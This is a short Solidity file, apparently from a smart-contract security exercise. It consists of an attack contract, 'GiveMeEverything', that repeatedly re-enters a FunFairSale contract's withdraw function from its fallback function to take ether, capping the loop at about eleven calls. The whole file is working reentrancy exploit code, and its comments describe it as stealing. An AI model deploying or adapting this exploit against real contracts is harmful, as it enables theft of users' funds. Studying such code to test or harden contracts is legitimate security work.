pragma solidity ^0.4.0;

import "7_safe.sol";

// I need no ether to attack,

contract GiveMeEverything {
    FunFairSale public fs;
    uint64 public theif_counter;
    
    constructor() payable {
        
    }
    
    function startAttack(address _addr) public {
        fs = FunFairSale(_addr);
        
        theif_counter = 0;
        theif_counter++;
        
        fs.withdraw();
        
    }
    
    function() public payable {
        
        // tries to steal a limited times to that the attack is successful (does not drain the resources)
        
        //tg.transferEth(address(this), 500000000000000000 wei);
        
        if (theif_counter < 11) {
            theif_counter++;
            fs.withdraw();
        }
        
    }
    
}